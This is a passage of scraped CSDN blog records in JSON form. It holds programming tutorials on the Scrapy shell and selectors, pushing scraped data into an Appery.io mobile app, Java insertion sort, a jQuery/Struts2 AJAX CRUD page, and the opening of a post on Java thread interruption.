“http://www.baidu.com”\n\n\n命令执行后，结果如下图：\n\n\n\n在我们执行scrapy shell url命令后，Scrapy终端根据下载页面会自动创建一些方便使用的对象和可用的快捷命令，如：\n\n可用的对象：\n\n\ncrawler：当前的Crawler的对象\nspider：处理URL的spider。\nrequest：最近获取到的页面的Request对象。\nresponse：包含最近获取到的页面的Response对象。\nscrapy：scrapy 模块 (包含 scrapy.Request, scrapy.Selector等)\nsettings：当前Scrapy项目的settings.py\n\n\n可用的快捷命令：\n\n\nshelp()：打印可用对象及快捷命令的帮助列表\nfetch(request_or_url)：根据给定的url或request获取到一个response，并更新相关的对象\nview(response)：在本机的浏览器打开给定的response。会在response的body中添加一个<base>tag，使得外部链接（例如图片及css）能正常显示。\n\n\neg:\n\n当我们执行scrapy shell \"http://www.baidu.com\"命令时，通过response对象调用selector，在调用xpath()。输出xpath查询结果。\n\n\n\nprint(response.selector.xpath(\"//title\"))\n\n# 输出结果：[<Selector xpath='//title' data='<title>百度一下</title>'>]\n\n\n\n\n除此之外，我们也可以通过response.selector.css()来解析响应的页面数据。\n\nScrapy还提供了快捷方式，如：response.xpath(),response.css()。\n\neg:\n\n\n\nprint(response.xpath(\"//title\"))\n\n# 输出结果：[<Selector xpath='//title' data='<title>百度一下</title>'>]\n\nSelector选择器\n\nScrapy Selector内置XPath和CSS Selector表达式机制\n\nSelector有四个基本的方法，最常用的还XPath\n\n\nxpath()：传入xpath表达式，返回该表达式所对应的所有节点的Selector list列表。\nectract()：序列化该节点为Unicode字符串，并返回list。\ncss()：传入CSS表达式，返回该表达式所对应的所有节点的selector list列表，语法同BeautifulSoup4。\nre()：根据传入的正则表达式对数据进行提取，返回Unicode字符串list列表。\n\n\neg：\n\n\n\n# 获取 title 标签的值\nprint(response.xpath(\"//title/text()\")[0].extract())\n\n# 输出： 百度一下", "time": "2018_08_14_11_12_29", "link": "https://blog.csdn.net/qq_33689414/article/details/78669500", "title": "Scrapy框架学习（二）----Item Pipeline(管道)和Scrapy Shell"}
{"timestamp": "2018_08_14_11_12_29", "desc": "我能够听到人们的尖叫声：“Appery.io是什么，一个手机应用的专用平台，它和Scrapy有什么关系？”那么，眼见为实吧。你可能还会对几年前在Excel电子表格上给某个人（朋友、管理者或者客户）展示数据时的场景印象深刻。不过现如今，除非你的听众都十分老练，否则他们的期望很可能会有所不同。在接下来的几页里，你将看到一个简单的手机应用，这是一个只需几次单击就能够创建出来的最小可视化产品，其目的是向利益相关者传达抽取所得数据的力量，并回到生态系统中，以源网站网络流量的形式展示它能够带来的价值。\n\n我将尽量保持简短的启发式示例，在这里它们将展示如何充分利用你的数据。\n\n1.1　选择手机应用框架\n\n借助于适当的工具向手机应用提供数据将是非常容易的事情。目前有许多优秀的跨平台手机应用开发框架，如PhoneGap、使用Appcelerator云服务的Appcelerator、jQuery Mobile和Sencha Touch。\n\n本文将使用Appery.io，因为它可以让我们使用PhoneGap和jQuery Mobile快速创建iOS、Android、Windows Phone以及HTML5手机应用。我和Scrapy都与Appery.io无任何利益关联。我会鼓励你独立进行调研，看看除了本文中提出的功能外，它是否也能符合你的需求。请注意这是一个付费服务，你可以有14天的试用期，不过在我看来，它可以让人无需动脑就能快速开发出原型，尤其是对于那些不是网络专家的人来说，为此付费是值得的。我选择该服务的主要原因是它既能提供手机应用，也能提供后端服务，也就是说我们不需要再去配置数据库、编写REST API或为服务端及手机应用使用其他一些语言。你将看到，我们一行代码都不用去编写！我们将会使用它们的在线工具；在任何时候，你都可以下载该应用，并作为PhoneGap项目，使用PhoneGap的所有功能。\n\n在本文中，你需要接入互联网连接，以便使用Appery.io。同时，还需要注意的是该网站的布局可能在未来会有所变化。请将我们的截屏作为参考，而不要在发现该网站外观不同时感到惊讶。\n\n1.2　创建数据库和集合\n\n第一步是通过单击Appery.io网站上的Sign-Up按钮并选取免费方案，来注册免费的Appery.io方案。你需要提供用户名、邮箱地址以及密码，然后就会创建好新账户了。等待几秒钟后，账户完成激活。然后就可以登录到Appery.io的仪表盘了。现在，开始准备创建新的数据库以及集合，如图1.1所示。 \n \n图1.1　使用Appery.io创建新数据库及集合\n\n为了完成该操作，需要按照如下步骤执行。\n\n1．单击Databases选项卡（1）。\n\n2．然后单击绿色的Create new database（2）按钮。将新数据库命名为scrapy（3）。\n\n3．现在，单击Create按钮（4）。此时会自动打开Scrapy数据库的仪表盘，在这里，你可以创建新的集合。\n\n在Appery.io的术语中，一个数据库是由一组集合组成的。大致来说，一个应用使用一个单独的数据库（至少在最初时是这样），每个数据库中包含多个集合，比如用户、房产、消息等。Appery.io默认已经提供了一个Users集合，其中包括用户名和密码（它们有很多内置功能）。图1.2所示为创建集合的过程。 \n \n图1.2　使用Appery.io创建新数据库及集合\n\n现在，我们添加一个用户，用户名为root，密码为pass。当然，你也可以选择更加安全的用户名和密码。为实现该目的，请单击侧边栏的Users集合（1），然后单击+Row添加用户/行（2）。在出现的两个字段中填入用户名和密码（3）和（4）。\n\n我们还需要创建一个新的集合，用于存储Scrapy抓取到的房产数据，并将该集合命名为properties。通过单击绿色的Create new collection按钮（5），将其命名为properties（6），然后单击Add按钮（7），就可以创建新的集合了。现在，我们还必须对该集合进行一些定制化处理。单击+Col添加数据库列（8）。每个数据库列都有其类型，用于对值进行校验。除了价格是数值类型外，大部分字段都是简单的字符串类型。我们将通过单击+Col添加几个列（8），并填充列名（9），如果不是字符串类型的话，还需要选择类型（10），然后单击Create column按钮（11）。重复该过程5次，创建表1.1中展示的列。\n\n表1.1 \n \n在集合创建的最后，你应该已经将所需的所有列都创建完成了，就像表1.1中所示的那样。现在已经准备好从Scrapy中导入一些数据了。\n\n1.3　使用Scrapy填充数据库\n\n首先，我们需要一个API key。我们可以在Settings选项卡（1）中找到它。复制该值（2），然后单击Collections选项卡（3）回到房产集合中，过程如图1.3所示。 \n \n图1.3　使用Appery.io创建新数据库及集合\n\n非常好！现在需要将数据导入到Appery.io中。我们先将项目以及名为easy的爬虫（easy.py）复制过来，并将该爬虫重命名为tomobile（tomobile.py）。同时，编辑文件，将其名称设为tomobile。 \n \n你可能已经注意到的一个问题是，这里并没有使用之前文节中用过的Web服务器（http://web:9312），而是使用了该站点的一个公开可用的副本，这是我存放在http://scrapybook.s3.amazonaws.com上的副本。之所以在本文中使用这种方式，是因为这样可以使图片和URL都能够公开可用，此时就可以非常轻松地分享应用了。\n\n我们将使用Appery.io的管道来插入数据。Scrapy管道通常是一个很小的Python类，拥有后置处理、清理及存储Scrapy Item的功能。就目前来说，你可以使用easy_install或pip安装它，不过如果你使用的是我们的Vagrant dev机器，则无需进行任何操作，因为我们已经将其安装好了。 \n \n或 \n \n此时，你需要对Scrapy的主设置文件进行一些小修改，将之前复制的API key添加进来。现在，我们所需要做的就是将如下行添加到properties/settings.py文件中。 \n \n不要忘记将APPERYIO_DB_ID替换为你的API key。此外，还需要确保设置中的用户名和密码，要和你在Appery.io中创建数据库用户时使用的相同。要想向Appery.io的数据库中填充数据，请像平常那样启动scrapy crawl。\n\n \n这次的输出会有些不同。可以看到在最开始的几行中，有一行是用于启用ApperyIoPipeline这个Item管道的；不过最明显的是，你会发现尽管抓取了100个Item，但是却有200次请求/响应。这是因为Appery.io的管道对每个Item都执行了一个到Appery.io服务端的额外请求，以便写入每一个Item。这些带有api.appery.io这个URL的请求同样也会在日志中出现。\n\n当回到Appery.io时，可以看到在properties集合（1）中已经填充好了数据（2），如图1.4所示。 \n \n图1.4　使用数据填充properties集合\n\n1.4　创建手机应用\n\n创建一个新的手机应用非常简单。我们只需单击Apps选项卡（1），然后单击绿色的Create new app按钮（2）。填写应用名称为properties（3），然后单击Create按钮进行创建就可以了，该过程如图1.5所示。 \n \n图1.5　创建新手机应用及数据库集合\n\n1.4.1　创建数据库访问服务\n\n创建新应用时的选项数量可能会有些多。使用Appery.io的应用编辑器，可以写出复杂的应用，不过我们将尽可能保持事情简单。我们最初需要的就是创建一个服务，能够让我们从应用中访问Scrapy数据库。为了达到这一目的，需要单击长方形的绿色按钮CREATE NEW（5），然后选择Database Services（6）。这时会弹出一个新的对话框，让我们选择想要连接的数据库。选择scrapy数据库（7）。这个菜单中的大部分选项都不会用到，现在只需要单击展开properties区域（8），然后选择List（9）。在后台，它会为我们编写代码，使得我们使用Scrapy爬取的数据可以在网络上使用。最后，单击Import selected services按钮完成（10）。\n\n1.4.2　创建用户界面\n\n下面将要开始创建应用所有的可视化元素了，这将会使用编辑器中的DESIGN选项卡来实现，如图1.6所示。 \n \n图1.6　创建用户界面\n\n从页面左侧的树中，展开Pages文件夹（1），然后单击startScreen（2）。UI编辑器将会打开该页面，我们可以在其中添加一些控件。下面使用编辑器编辑标题，以便对其更加熟悉。单击头部标题（3），然后会发现屏幕右侧的属性区域会变为显示标题的属性，其中包含一个Text属性，将该属性值修改为Scrapy App，屏幕中间的标题也会相应地更新。\n\n然后，需要添加一个网格组件，从左侧面板（5）中拖曳Grid控件即可实现。该控件有两行，而根据我们的需求，只需要一行即可。选择刚刚添加的网格。当手机视图顶部的缩略图区域（6）变灰时，就可以知道该网格已经被选取了。如果没有被选取，单击该网格以便选中。然后右侧的属性栏会更新为网格的属性。这里只需要将Rows属性设置为1，然后单击Apply即可（7）和（8）。现在，该网格就会被更新为只有一行了。\n\n最后，拖拽另外一些控件到网格中。首先要在网格左侧添加图片控件（9），然后在网格右侧添加链接（10），最后在链接下面添加标签（11）。\n\n就布局而言，此时已经足够。接下来将从数据库中向用户界面输入数据。\n\n1.4.3　将数据映射到用户界面\n\n目前为止，我们花费了大量时间在DESIGN选项卡中，以创建应用的可视化效果。为了将可用的数据链接到这些控件中，需要切换到DATA选项卡（1），如图1.7所示。 \n \n图1.7　将数据映射到用户界面\n\n选择Service（2）作为数据源类型。由于前面创建的服务是唯一可用的服务，因此它会被自动选取。然后可以继续单击Add按钮（3），此时服务属性将会在其下方列出。只要按下了Add按钮，就会看到像Before send以及Success这样的事件。我们可以通过单击Success后面的Mapping按钮，定制服务成功调用后要做的事情。\n\n此时会打开Mapping action editor，我们可以在这里完成连线。该编辑器有两侧。左侧是服务响应中可用的字段，而在右侧中可以看到前面步骤中添加的UI控件的属性。两侧都有一个Expand all链接，单击该链接可以看到所有可用的数据和控件。接下来，需要按照表1.2中给出的5个映射，从左侧向右侧拖曳。\n\n表1.2 \n \n1.4.4　数据库字段与用户界面控件间映射\n\n表1.2中项的数量可能会与你的情况有些许差别，不过由于每种控件都只有一个，因此出错的可能性非常小。通过设置这些映射，我们通知Appery.io在后台编写所有代码，以便在数据库查询成功时使用数据库中的值加载控件。下面，可以单击Save and return按钮（6）继续。\n\n此时又回到了DATA选项卡，如图1.7所示。由于还需要返回到UI编辑器当中，因此需要单击DESIGN选项卡（7）。在屏幕下方，你会发现一个EVENTS区域（8），尽管该区域一直存在，但它刚刚才被展开。在EVENTS区域中，我们让Appery.io做一些事情，作为对UI事件的响应。这是我们需要执行的最后一个步骤。它会让应用在UI加载完成后立即调用服务取回数据。为了实现该功能，我们需要选择startScreen作为组件，并将事件保持为默认的Load选项。然后选择Invoke service作为action，保持Datasource为默认的restservice1选项（9）。最后，单击Save（10），这就是我们为创建这个手机应用所做的所有事情了。\n\n1.4.5　测试、分享及导出你的手机应用\n\n现在，可以测试这个应用了。我们所需要做的事情就是单击UI生成器顶部的TEST按钮（1），如图1.8所示。 \n \n图1.8　运行在你浏览器中的手机应用\n\n手机应用将会在浏览器中运行。这些链接都是有效的（2），可以浏览。可以预览不同的手机屏幕方案以及设备方向，也可以单击View on Phone按钮，此时会显示一个二维码，你可以使用移动设备扫描该二维码，并预览该应用。你只需分享其生成的链接，其他人也可以在他们的浏览器中尝试该应用。\n\n只需单击几下，我们就可以将Scrapy抓取的数据组织起来，并展示在手机应用中。如果你需要更进一步地定制该应用，可以参考Appery.io提供的教程，其网址为http://devcenter.appery.io/tutorials/。当一切准备就绪时，就可以通过EXPORT按钮导出该应用了，Appery.io提供了非常丰富的导出选项，如图1.9所示。 \n \n图1.9　你可以将应用导出到大部分主流移动平台\n\n你可以导出项目文件，在自己喜欢的IDE中进一步开发；也可以获得二进制文件，发布到各个平台的手机市场当中。\n\n1.5　本文小结\n\n使用Scrapy和Appery.io这两个工具，我们拥有了一个可以抓取网站并且能够将数据插入到数据库中的系统。此外，我们还得到了RESTful API，以及一个简单的可以用于Android和iOS的手机应用。对于高级特性和进一步开发，你可以更加深入到这些平台中，将其中部分开发工作外包给领域专家，或是研究替代方案。现在，你只需要最少的编码，就能够拥有一个可以演示应用理念的最小产品。\n\n你会注意到，在如此短的开发时间中，我们的应用看起来还不错。这是因为它使用了真实的数据，而不是占位符，并且所有链接都是可用且有意义的。我们成功创建了一个尊重其生态（源网站）的最小可用产品，并以流量的形式将价值回馈给源网站。\n\n现在，我们可以开始学习如何使用Scrapy爬虫在更加复杂的场景下抽取数据了。\n\n本文摘自《精通Python爬虫框架Scrapy》\n\n\n\n《精通Python爬虫框架Scrapy》 \n 【美】迪米特里奥斯 考奇斯-劳卡斯（Dimitrios Kouzis-Loukas）箸  \n\n点击封面购买纸书\n\nPython3 scrapy教程,全面剖析网络爬虫技术的实现原理,通过爬取示例演示Scrapy的应用,涵盖从桌面端爬取到移动端爬取,实时爬取在内的所有内容。\n\n本书讲解了Scrapy的基础知识，讨论了如何从任意源提取数据，如何清理数据，以及如何使用Python和第三方API进行处理，以满足自身需求。本书还讲解了如何将爬取的数据高效地馈入数据库、搜索引擎和流数据处理系统（比如Apache Spark）。在学习完本书后，你将对数据爬取胸有成竹，并将数据应用在自己的应用程序中。  \n \n \n在“异步社区”后台回复“关注”，即可免费获得2000门在线视频课程；推荐朋友关注根据提示获取赠书链接，免费得异步图书一本。赶紧来参加哦！ \n扫一扫上方二维码，回复“关注”参与活动！ \n阅读原文，购买《精通Python爬虫框架Scrapy》", "time": "2018_08_14_11_12_29", "link": "https://blog.csdn.net/epubit17/article/details/79456723", "title": "精通Python爬虫从Scrapy到移动应用（文末福利）"}
{"timestamp": "2018_08_14_11_12_29", "desc": "插入排序（insertion sorting）\n\n大体含义是这样的，想我们在打扑克牌理牌时的思路一样，来一张扑克牌做一次插入操作。\n\n\n\n下面我们给出普通版和优化版的插入排序\n\n\n\n    public int [] insertionSort(int [] arr){\n        for (int i = 1; i<arr.length;i++){\n            for (int j = i; j>0 && arr[j] < arr[j-1];j--){\n                int temp = arr[j];//循环比较两个相邻的值，满足排序条件做交换，不满足跳出当前这层循环\n                arr[j] = arr[j-1];\n                arr[j-1] = temp;\n            }\n        }\n        return arr;\n    }\n\n    public int [] insertionSortPlus(int [] arr){\n        for (int i = 1; i<arr.length;i++){\n            int x = arr[i]; //记录当前抽的数\n            int j;          //记录数的位置\n            for (j = i; j>0 && arr[j-1] >x;j--){\n                arr[j] = arr[j-1];//挪位置\n            }\n            arr[j] = x;     //最后处理当前抽的数的位置归宿 需要注意的是这里的 j 是上面 for 循环退出时的值\n        }\n        return arr;\n    }\n\n优化版的算法主要在于交换的次数上的优化，在数组本身的顺序较为良好的情况下，这种插入排序的优势可以体现出来，因为不用向冒泡或是选择排序那样必须走完内层循环，找到一个合适的时机可以提前跳出内层循环。\n\n\n\n图解算法目录\n\n【图解算法】排序算法——冒泡排序、选择排序\n\n【图解算法】排序算法——插入排序\n\n【图解算法】排序算法——归并排序\n\n【图解算法】排序算法——快速排序\n\n【图解算法】Java GC算法\n\n【图解算法】排序算法——堆排序\n\n【图解算法】并查集 —— 联合查找算法\n\nGif Power By https://visualgo.net", "time": "2018_08_14_11_12_29", "link": "https://blog.csdn.net/xiaoping0915/article/details/72949784", "title": "【图解算法】排序算法——插入排序"}
{"timestamp": "2018_08_14_11_12_29", "desc": "0.首先还是按照惯例，上效果图（no picture, no …） \n \n可以看到使用ajax异步的方式去做crud操作时，整个页面是没有刷新的（参考左上角的刷新按钮），这种体验更像是C/S架构\n\n1.AJAX即“Asynchronous Javascript And XML”（异步JavaScript和XML）——用于创建更好更快以及 交互性 更强的Web应用程序的技术。\n\n2.页面代码 emp_list.jsp\n\n\n\n<%@ page language=\"java\" contentType=\"text/html; charset=utf-8\"\n    pageEncoding=\"utf-8\"%>\n<%@ taglib prefix=\"s\" uri=\"/struts-tags\" %>\n<!DOCTYPE html PUBLIC >\n<html>\n    <head>\n        <title>ajax emp system</title>\n        <meta charset=\"UTF-8\" />\n    </head>\n    <body>\n        <div class=\"container\">\n            <!-- 模态框（Modal）添加框 -->\n            <div></div>\n            <div class=\"modal fade\" id=\"modalAddEmp\" tabindex=\"-1\" role=\"dialog\" aria-labelledby=\"myModalLabel\" aria-hidden=\"true\">\n                <div class=\"modal-dialog\">\n                    <div class=\"modal-content\">\n                        <div class=\"modal-header\">\n                            <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">\n                    &times;\n                </button>\n                            <h4 class=\"modal-title\" id=\"myModalLabel\">\n                    添加员工\n                </h4>\n                        </div>\n                        <div class=\"modal-body\">\n                            <form id=\"form_add\" class=\"form-horizontal\" role=\"form\">\n                                <div class=\"form-group\">\n                                    <label for=\"firstname\" class=\"col-sm-2 control-label\">名字</label>\n                                    <div class=\"col-sm-10\">\n                                        <input type=\"text\" class=\"form-control\" name=\"emp.ename\" placeholder=\"请输入员工姓名\">\n                                    </div>\n                                </div>\n                                <div class=\"form-group\">\n                                    <label for=\"lastname\" class=\"col-sm-2 control-label\">职业</label>\n                                    <div class=\"col-sm-10\">\n                                        <input type=\"text\" class=\"form-control\" name=\"emp.job\" placeholder=\"请输入员工职业\">\n                                    </div>\n                                </div>\n                                <div class=\"form-group\">\n                                    <label for=\"lastname\" class=\"col-sm-2 control-label\">薪水</label>\n                                    <div class=\"col-sm-10\">\n                                        <input type=\"text\" class=\"form-control\" name=\"emp.sal\" placeholder=\"请输入员工薪水\">\n                                    </div>\n                                </div>\n                                <div class=\"form-group\">\n                                    <label for=\"lastname\" class=\"col-sm-2 control-label\">选择部门</label>\n                                    <div class=\"col-sm-10\">\n                                        <select id=\"addSele\" class=\"form-control\" name=\"emp.dept.deptno\">\n\n                                        </select>\n                                    </div>\n                                </div>\n                                <div class=\"form-group\">\n                                    <div class=\"col-sm-offset-2 col-sm-10\">\n                                        <button type=\"button\" class=\"btn btn-default\" data-dismiss=\"modal\">关闭</button>\n            <button id=\"btnadd\" type=\"button\" class=\"btn btn-primary\" data-dismiss=\"modal\">确认添加</button>\n                                    </div>\n                                </div>\n                            </form>\n                        </div>\n\n                    </div>\n                    <!-- /.modal-content -->\n                </div>\n                <!-- /.modal -->\n            </div>\n\n            <!-- 模态框（Modal）修改框 -->\n            <div>\n                <div   class=\"modal fade\" id=\"modalUpdateEmp\" tabindex=\"-2\" role=\"dialog\" aria-labelledby=\"myModalLabel\" aria-hidden=\"true\">\n                    <div class=\"modal-dialog\">\n                        <div class=\"modal-content\">\n                            <div class=\"modal-header\">\n                                <button type=\"button\" class=\"close\" data-dismiss=\"modal\" aria-hidden=\"true\">\n                    &times;\n                </button>\n                                <h4 class=\"modal-title\" id=\"myModalLabel\">\n                    修改员工\n                </h4>\n                            </div>\n                            <div class=\"modal-body\">\n                                <form id=\"form_update\" class=\"form-horizontal\" role=\"form\">\n                                    <input type=\"text\" id =\"empno\" name=\"emp.empno\" \"\n                  hidden=\"hidden\">\n                                    <div class=\"form-group\">\n                                        <label for=\"firstname\" class=\"col-sm-2 control-label\">名字</label>\n                                        <div class=\"col-sm-10\">\n                                            <input type=\"text\" id=\"ename\" class=\"form-control\" name=\"emp.ename\" placeholder=\"请输入员工姓名\">\n                                        </div>\n                                    </div>\n                                    <div class=\"form-group\">\n                                        <label for=\"lastname\" class=\"col-sm-2 control-label\">职业</label>\n                                        <div class=\"col-sm-10\">\n                                            <input type=\"text\" id=\"job\" class=\"form-control\" name=\"emp.job\" placeholder=\"请输入员工职业\">\n                                        </div>\n                                    </div>\n                                    <div class=\"form-group\">\n                                        <label for=\"lastname\" class=\"col-sm-2 control-label\">薪水</label>\n                                        <div class=\"col-sm-10\">\n                                            <input type=\"text\" id=\"sal\" class=\"form-control\" name=\"emp.sal\" placeholder=\"请输入员工薪水\">\n                                        </div>\n                                    </div>\n                                    <div class=\"form-group\">\n                                        <label for=\"lastname\" class=\"col-sm-2 control-label\">选择部门</label>\n                                        <div class=\"col-sm-10\">\n                                            <select id=\"updateSele\" class=\"form-control\" name=\"emp.dept.deptno\">\n                                                <s:iterator value=\"listDept\" var=\"dept\">\n                                                    <option value=\"<s:property value=\" #dept.deptno \"/>\"><s:property value=\"#dept.dname\" /></option>\n                                                </s:iterator>\n                                            </select>\n                                        </div>\n                                    </div>\n                                    <div class=\"form-group\">\n                                        <div class=\"col-sm-offset-2 col-sm-10\">\n                                            <button type=\"button\" class=\"btn btn-default\" data-dismiss=\"modal\">关闭</button>\n            <button id=\"btnupdate\" type=\"button\" class=\"btn btn-primary\" data-dismiss=\"modal\">确认修改</button>\n                                        </div>\n                                    </div>\n                                </form>\n                            </div>\n\n                        </div>\n                        <!-- /.modal-content -->\n                    </div>\n                    <!-- /.modal -->\n                </div>\n            </div>\n            <!--\n        ${pageContext.request.contextPath}/emp_toadd\n    -->\n            <a id=\"btnAdd\" class=\"btn btn-default btn-lg \" data-toggle=\"modal\" data-target=\"#modalAddEmp\">添加员工</a>\n            <table class=\"table table-hover\" id=\"tbl\">\n                <caption>&nbsp&nbsp员工信息列表</caption>\n                <thead>\n                    <tr>\n                        <th>员工编号</th>\n                        <th>员工姓名</th>\n                        <th>职业</th>\n                        <th>部门</th>\n                        <th>工资</th>\n                        <th>操作</th>\n                    </tr>\n                </thead>\n                <tbody id=\"tbody\">\n\n                </tbody>\n            </table>\n        </div>\n\n        <!-- 新 Bootstrap 核心 CSS 文件 -->\n        <link href=\"http://cdn.static.runoob.com/libs/bootstrap/3.3.7/css/bootstrap.min.css\" rel=\"stylesheet\">\n        <!-- jQuery文件。务必在bootstrap.min.js 之前引入 -->\n        <script src=\"http://cdn.static.runoob.com/libs/jquery/2.1.1/jquery.min.js\"></script>\n        <!-- 最新的 Bootstrap 核心 JavaScript 文件 -->\n        <script src=\"http://cdn.static.runoob.com/libs/bootstrap/3.3.7/js/bootstrap.min.js\"></script>\n        <script type=\"text/javascript\">\n            var url_delemp = '${pageContext.request.contextPath}/emp_delAjax?emp.empno';\n            var url_getemp = '${pageContext.request.contextPath}/emp_getAjax?emp.empno';\n            var url_addemp = '${pageContext.request.contextPath}/emp_addAjax';\n            var url_updateemp = '${pageContext.request.contextPath}/emp_updateAjax';\n            var url_getemplist = '${pageContext.request.contextPath}/emp_listAjax';\n            var url_getdeptlist = '${pageContext.request.contextPath}/dept_listAjax';\n            $(function() {\n                refreshEmpList();\n                bindEven();\n            });\n            window.onload=function(){ \n                getDeptList();\n            }\n            //获取部门列表\n            function getDeptList(){\n                $.getJSON(url_getdeptlist,function(data,status){\n                    $adds = $('#addSele');\n                    $upds = $('#updateSele');\n                    $adds.html('');\n                    $upds.html('');\n                    $.each(data.list, function(index,d) {\n                        $adds.append('<option value =\"'+ d.deptno + '\">' + d.dname +\n                                '</option>');\n                        $upds.append('<option value =\"'+ d.deptno + '\">' + d.dname +\n                                '</option>');\n                    });\n                });\n            }\n            //绑定事件\n            function bindEven() {\n                $('table').on('click', '#btnDel', function() {\n                    if(confirm('真的要删除吗？')) {\n                        //异步删除\n                        delEmp($(this).attr('value'));\n                    }\n                });\n                $('table').on('click', '#btnModif', function() {\n                    //先show出修改的模态层，并将查到的数据加进去\n                    $tr = $(this).parent().parent();\n                    var $value = $tr.children('td').eq(3).attr('deptno');\n                    $('#updateSele').val($value);\n                    $('#empno').val($tr.children('td').eq(0).text());\n                    $('#ename').val($tr.children('td').eq(1).text());\n                    $('#job').val($tr.children('td').eq(2).text());\n                    $('#sal').val($tr.children('td').eq(4).text());\n\n                    console.log($('#updateSele').val());\n                });\n\n                $('#btnadd').on('click', function() {\n                    $res = $('#form_add').serialize();\n                    $.ajax({\n                        url: url_addemp,\n                        type: \"POST\", //GET或POST,\n                        data: $res,\n                        success: function(data) {\n                            refreshEmpList();\n                        }\n                    });\n                });\n\n                $('#btnupdate').on('click', function() {\n                    $res = $('#form_update').serialize();\n                    $.ajax({\n                        url: url_updateemp,\n                        type: 'post',\n                        data: $res,\n                        success: function(data) {\n                            refreshEmpList();\n                        }\n\n                    });\n                });\n            }\n            //删除员工\n            function delEmp(empno) {\n                console.log('empno:' + empno);\n                $.getJSON(url_delemp + \"=\" + empno, function(data, status) {\n                    console.log(data);\n                    //刷新列表\n                    refreshEmpList();\n                });\n            }\n            //刷新列表\n            function refreshEmpList() {\n                //异步刷新\n                $.getJSON(url_getemplist, function(data, status) {\n                    console.log(data);\n                    //刷新列表\n                    $tb = $('#tbody');\n                    $tb.html('');\n                    $.each(data.list, function(index,data) {\n                        $tb.append('<tr><td>'+data.empno+'</td>'+\n                        '<td>'+data.ename+'</td>'+\n                        '<td>'+data.job+'</td>'+\n                        '<td deptno ='+data.dept.deptno+'>'+data.dept.dname+'</td>'+\n                        '<td>'+data.sal+'</td>'+\n                        '<td><a id=\"btnDel\" value=\"'+data.empno+'\">删除</a>  &nbsp&nbsp&nbsp&nbsp  <a id=\"btnModif\" data-toggle=\"modal\" data-target=\"#modalUpdateEmp\">修改</a></td></tr>');\n                    });\n                });\n            }\n        </script>\n    </body>\n</html>\n\n3.服务器数据支持代码 EmpAction.java\n\n\n\n@Controller\n@Scope(\"prototype\")\n@ParentPackage(\"json-default\")\npublic class EmpAction extends ActionSupport{\n    private Emp emp;\n    private List<Emp> list;\n    @Autowired EmpService empService;\n\n    @Action(value= \"/emp_listAjax\",results={\n            @Result(name=\"success\",type=\"json\", params = { \"includeProperties\",\n            \"^list\\\\[\\\\d+\\\\]\\\\.empno,^list\\\\[\\\\d+\\\\]\\\\.ename,^list\\\\[\\\\d+\\\\]\\\\.job,^list\\\\[\\\\d+\\\\]\\\\.hiredate,^list\\\\[\\\\d+\\\\]\\\\.sal,^list\\\\[\\\\d+\\\\]\\\\.dept,^list\\\\[\\\\d+\\\\]\\\\.dept.dname,^list\\\\[\\\\d+\\\\]\\\\.dept.deptno\" })\n    })\n    public String listAjax(){\n        list = empService.getAll();\n        return SUCCESS;\n    }\n\n    @Action(value = \"/emp_delAjax\",results={\n        @Result(name = \"success\",type =\"json\",params = { \"includeProperties\",\"^emp.empno,^emp.ename\" })\n    })\n    public String delAjax(){\n        emp = empService.find(emp);\n        empService.del(emp);\n        return SUCCESS;\n    }\n\n    @Action(value = \"/emp_addAjax\")\n    public String addAjax(){\n        empService.add(emp);\n        return null;\n    }\n\n    @Action(value = \"/emp_updateAjax\")\n    public String updateAjax(){\n        empService.update(emp);\n        return null;\n    }\n}\n\nDeptAction.java\n\n\n\n@Controller\n@Scope(\"prototype\")\n@ParentPackage(\"json-default\")\npublic class DeptAction extends ActionSupport{\n    private List<Dept> list;\n    @Autowired DeptService deptService;\n\n    @Action(value= \"/dept_listAjax\",results={\n        @Result(name=\"success\",type=\"json\")\n    })\n    public String listAjax(){\n        list = deptService.getAll();\n        return \"success\";\n    }\n}\n\n4.解决的问题 \n（a）bootstrap 多个（大于2个）模态框 在页面上谁都显示不出来问题 \n这种情况只需要在模态框的div外层各套一个div即可 \n（b）在struts2的Action中使用JSON数据格式来传值 \n首先我们的Action类的父包配置为json-default，即在Action类头部注解上@ParentPackage(“json-default”) 然后指定@Result 的type属性为json 最后使用正则的方式表明你想要获得的数据 eg: params = { “includeProperties”,”^emp.empno,^emp.ename” }\n\n5.附录一些常用的jQuery代码 \n(a)AJAX请求\n\n$(function() {\n    $('#btnSend').click(function() {\n        $.ajax({\n            type: \"GET\", //GET或POST,\n            async:true, //默认设置为true，所有请求均为异步请求。\n            url: \"${pageContext.request.contextPath}/dept_listAjax\",\n            data: {\n                username: $(\"#username\").val(),\n                content: $(\"#content\").val()\n            },\n            dataType: \"json\", //xml、html、script、jsonp、text\n            beforeSend:function(){},\n            complete:function(){},\n            success: function(data) {\n                alert(data)\n            }\n            error:function(){},\n        });\n    });\n});\n\n(b)获取checkbox，并判断是否选中\n\n\n\n$(\"input[type='checkbox']\").is(':checked') \n//返回结果：选中=true，未选中=false\n\n(c)获取checkbox选中的值\n\n\n\nvar chk_value =[]; \n$('input[name=\"test\"]:checked').each(function(){ \n    chk_value.push($(this).val()); \n});\n\n6.Demo下载", "time": "2018_08_14_11_12_29", "link": "https://blog.csdn.net/xiaoping0915/article/details/59735713", "title": "【J2EE】ajax实现页面无刷新完成crud操作"}
{"timestamp": "2018_08_14_11_12_29", "desc": "1.什么是线程的中断\n\n线程中断可以简单地理解为线程（Thread）有一个属性叫做“中断”，可以通过调用很多方法来查看该线程的这个属性的状态（TRUE、FALSE）\n\n\n\n2.我调用这些方法的之后线程会立即中断么？\n\n来看个例子：\n\n\n\npublic class MyThread extends Thread {\n    @Override\n    public void run() {\n        super.run();\n        for (int i = 0; i < 50000; i++) {\n            System.out.println(i);\n        }\n    }\n}\n\n\n\npublic class Run {\n    public static void main(String[] args) throws InterruptedException {\n        MyThread thread = new MyThread();\n        thread.start();\n        Thread.sleep(1000);\n        //调用线程Mythread的实例的中断方法\n        thread.interrupt();\n   }\n}\n\n在main线程挂起1秒之后，然后main线程给Mythread的实例（这里简写为MTH）发送了一个消息，告诉他“你把你的中断属性设置为TRUE”，但是MTH收到了这个消息之后只是单存地把这个自己的属性设置为TRUE，”然后并不中断自己”。\n\n控制台打印1-49999：\n\n\n\n49993\n49994\n49995\n49996\n49997\n49998\n49999\n\nProcess finished with exit code 0\n\n到这里答案已经很明显了，线程并不会因为简单地收到了其他线程的消息而中断自己\n\n\n\n！！！如果要中断自己还要有附加操作\n\n这些额外的操作是什么？\n\n\n\n//Interrupted的经典使用代码    \n    